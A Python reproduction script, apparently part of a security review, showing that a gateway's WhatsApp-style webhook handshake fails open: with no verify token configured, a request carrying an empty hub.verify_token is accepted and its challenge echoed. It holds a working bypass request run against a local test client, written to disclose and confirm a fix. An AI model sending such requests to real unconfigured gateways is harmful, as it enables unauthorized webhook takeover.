"""Reproduction: webhook verification fails OPEN when no verify token is set.

Run from a fresh checkout:
    uv run python repro_webhook_verify_fail_open.py

WHAT IT SHOWS
-------------
GET /v1/channels/{name}/webhook implements the Meta/WhatsApp subscription
handshake: the caller presents hub.verify_token and the server compares it to
the per-channel shared secret {NAME}_VERIFY_TOKEN. On success it echoes the
caller's hub.challenge.

The secret is a per-deployment env var and is UNSET by default. When unset:

    expected = os.environ.get(f"{name.upper()}_VERIFY_TOKEN", "")   # -> ""
    hmac.compare_digest(token, expected)                            # "" == "" -> True

So an attacker sends hub.verify_token="" and the server accepts the handshake
and echoes any hub.challenge — a fail-OPEN authentication bypass. An attacker
can complete the webhook verification for any not-yet-configured channel on the
public gateway URL.

Invariant broken: #2 — an action (the subscription verification) passes an
authenticity check it should not, because a missing secret is treated as a
valid empty credential. Not catalogued in Sections 6 or 7.

EXPECTED OUTPUT
---------------
  unpatched: status=200 body='PWNED'   -> BYPASS
  patched:   status=403                -> rejected
"""

from __future__ import annotations

import os
import tempfile

os.environ.setdefault("GLC_CONFIG_DIR", tempfile.mkdtemp(prefix="glc-repro-"))
# Deliberately do NOT set WEBUI_VERIFY_TOKEN — this is the default posture.
os.environ.pop("WEBUI_VERIFY_TOKEN", None)

from fastapi.testclient import TestClient  # noqa: E402

import glc.main as m  # noqa: E402


def main() -> None:
    with TestClient(m.app) as c:
        r = c.get(
            "/v1/channels/webui/webhook",
            params={"hub.mode": "subscribe", "hub.verify_token": "", "hub.challenge": "PWNED"},
        )
        print(f"status={r.status_code} body={r.text!r}")
        if r.status_code == 200 and "PWNED" in r.text:
            print("BUG REPRODUCED: unconfigured channel accepted an empty verify token (fail-open).")
        elif r.status_code == 403:
            print("FIXED: verification fails closed when no token is configured.")
        else:
            print("inconclusive")


if __name__ == "__main__":
    main()
